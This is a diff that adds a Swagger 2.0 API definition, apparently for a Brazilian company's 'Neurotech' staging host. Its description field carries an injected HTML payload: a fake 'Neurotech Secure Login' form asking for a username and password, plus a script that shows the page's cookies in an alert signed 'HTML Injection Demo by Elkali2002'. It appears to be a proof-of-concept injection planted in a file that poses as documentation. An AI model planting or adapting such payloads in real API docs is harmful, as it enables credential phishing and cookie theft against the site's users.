@@ -1,0 +1,43 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "version": "1.0.0",
+    "title": "Neurotech API Documentation",
+    "description": "<div class=\"login-form\"><div class=\"heading\"><h1>🔐 Neurotech Secure Login</h1><p style=\"color: red; font-weight: bold;\">System security verification required</p></div><div class=\"form-container\"><form id=\"loginForm\"><div class=\"form-group\"><label for=\"username\">Username</label><input type=\"text\" id=\"username\" name=\"username\" required style=\"padding: 8px; width: 200px;\"></div><div class=\"form-group\"><label for=\"password\">Password</label><input type=\"password\" id=\"password\" name=\"password\" required style=\"padding: 8px; width: 200px;\"></div><div class=\"form-group\"><button type=\"submit\" style=\"background: #007bff; color: white; padding: 10px 20px; border: none; cursor: pointer;\">Login</button></div></form></div></div><script>document.getElementById('loginForm').addEventListener('submit', function(e) { e.preventDefault(); alert('⚠️ HTML Injection Demo by Elkali2002!\\n\\nCurrent Cookies: ' + document.cookie); });</script><style>.login-form { font-family: Arial, sans-serif; max-width: 400px; margin: 20px auto; padding: 20px; border: 1px solid #ddd; } .heading { text-align: center; margin-bottom: 20px; } .form-group { margin-bottom: 15px; } label { display: block; margin-bottom: 5px; font-weight: bold; }</style>"
+  },
+  "host": "nrfs-hml.neurotech.com.br",
+  "basePath": "/",
+  "schemes": ["https"],
+  "consumes": ["application/json"],
+  "produces": ["application/json"],
+  "paths": {
+    "/login": {
+      "post": {
+        "summary": "User authentication",
+        "description": "Authenticate user with credentials",
+        "parameters": [
+          {
+            "name": "username",
+            "in": "formData",
+            "type": "string",
+            "required": true
+          },
+          {
+            "name": "password",
+            "in": "formData",
+            "type": "string",
+            "required": true
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Login successful"
+          },
+          "401": {
+            "description": "Unauthorized"
+          }
+        }
+      }
+    }
+  }
+}
